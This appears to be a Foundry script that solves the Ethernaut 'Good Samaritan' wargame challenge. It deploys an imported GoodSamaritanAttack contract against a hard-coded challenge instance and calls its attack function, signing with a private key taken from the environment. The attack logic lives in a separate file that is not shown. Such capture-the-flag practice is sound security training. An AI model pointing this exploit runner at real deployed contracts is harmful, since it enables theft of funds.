// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/GoodSamaritanAttack.sol"; // 1) add file


contract SolveGoodSamaritan is Script { // 2) change contractName

    function run() external {

        address target = 0x3451E917FB1A46dfBF3b755AFd89A2C26F976D23; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        GoodSamaritanAttack attacker = new GoodSamaritanAttack(target);
        attacker.attack();

        vm.stopBroadcast();

    }
}